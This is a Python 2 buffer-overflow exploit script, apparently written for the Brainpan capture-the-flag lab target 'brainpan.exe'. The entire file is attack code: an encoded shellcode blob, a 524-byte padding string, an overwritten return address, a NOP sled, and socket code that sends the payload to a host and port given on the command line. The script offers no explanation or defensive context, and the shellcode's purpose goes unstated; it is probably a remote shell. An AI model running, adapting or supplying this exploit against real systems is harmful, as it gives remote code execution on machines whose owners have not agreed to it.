#!/usr/bin/python

import time, struct, sys
import socket as so

buf =  b""
buf += b"\xdb\xdd\xd9\x74\x24\xf4\x5a\x2b\xc9\xbe\x54\x17\x3e"
buf += b"\xd9\xb1\x52\x83\xea\xfc\x31\x72\x13\x03\x26\x04\xdc"
buf += b"\x2c\x3a\xc2\xa2\xcf\xc2\x13\xc3\x46\x27\x22\xc3\x3d"
buf += b"\x2c\x15\xf3\x36\x60\x9a\x78\x1a\x90\x29\x0c\xb3\x97"
buf += b"\x9a\xbb\xe5\x96\x1b\x97\xd6\xb9\x9f\xea\x0a\x19\xa1"
buf += b"\x24\x5f\x58\xe6\x59\x92\x08\xbf\x16\x01\xbc\xb4\x63"
buf += b"\x9a\x37\x86\x62\x9a\xa4\x5f\x84\x8b\x7b\xeb\xdf\x0b"
buf += b"\x7a\x38\x54\x02\x64\x5d\x51\xdc\x1f\x95\x2d\xdf\xc9"
buf += b"\xe7\xce\x4c\x34\xc8\x3c\x8c\x71\xef\xde\xfb\x8b\x13"
buf += b"\x62\xfc\x48\x69\xb8\x89\x4a\xc9\x4b\x29\xb6\xeb\x98"
buf += b"\xac\x3d\xe7\x55\xba\x19\xe4\x68\x6f\x12\x10\xe0\x8e"
buf += b"\xf4\x90\xb2\xb4\xd0\xf9\x61\xd4\x41\xa4\xc4\xe9\x91"
buf += b"\x07\xb8\x4f\xda\xaa\xad\xfd\x81\xa2\x02\xcc\x39\x33"
buf += b"\x0d\x47\x4a\x01\x92\xf3\xc4\x29\x5b\xda\x13\x4d\x76"
buf += b"\x9a\x8b\xb0\x79\xdb\x82\x76\x2d\x8b\xbc\x5f\x4e\x40"
buf += b"\x3c\x5f\x9b\xc7\x6c\xcf\x74\xa8\xdc\xaf\x24\x40\x36"
buf += b"\x20\x1a\x70\x39\xea\x33\x1b\xc0\x7d\xfc\x74\xf2\x1b"
buf += b"\x94\x86\x02\xe5\xdf\x0e\xe4\x8f\x0f\x47\xbf\x27\xa9"
buf += b"\xc2\x4b\xd9\x36\xd9\x36\xd9\xbd\xee\xc7\x94\x35\x9a"
buf += b"\xdb\x41\xb6\xd1\x81\xc4\xc9\xcf\xad\x8b\x58\x94\x2d"
buf += b"\xc5\x40\x03\x7a\x82\xb7\x5a\xee\x3e\xe1\xf4\x0c\xc3"
buf += b"\x77\x3e\x94\x18\x44\xc1\x15\xec\xf0\xe5\x05\x28\xf8"
buf += b"\xa1\x71\xe4\xaf\x7f\x2f\x42\x06\xce\x99\x1c\xf5\x98"
buf += b"\x4d\xd8\x35\x1b\x0b\xe5\x13\xed\xf3\x54\xca\xa8\x0c"
buf += b"\x58\x9a\x3c\x75\x84\x3a\xc2\xac\x0c\x4a\x89\xec\x25"
buf += b"\xc3\x54\x65\x74\x8e\x66\x50\xbb\xb7\xe4\x50\x44\x4c"
buf += b"\xf4\x11\x41\x08\xb2\xca\x3b\x01\x57\xec\xe8\x22\x72"

payload = "A" * 524 + "\xf3\x12\x17\x31" + (900 - 524 - 4 - int(len(buf))) * "\x90" + buf

try: 
    server = str(sys.argv[1])
    port = int(sys.argv[2])
except IndexError:
    print "Usage: python brainpan3.py %s 192.168.56.101 9999" % sys.argv[0]
    sys.exit()

s = so.socket(so.AF_INET, so.SOCK_STREAM)
print "Attempting to send buffer overflow to brainpan.exe of", server, port

try:
    time.sleep(1)
    s.connect((server, port))
    s.send(payload + '\r\n')
    print "\n---COMPLETED---"
except:
    print "\nUnable to connect, check if the IP address and PORT is correct"
    sys.exit()
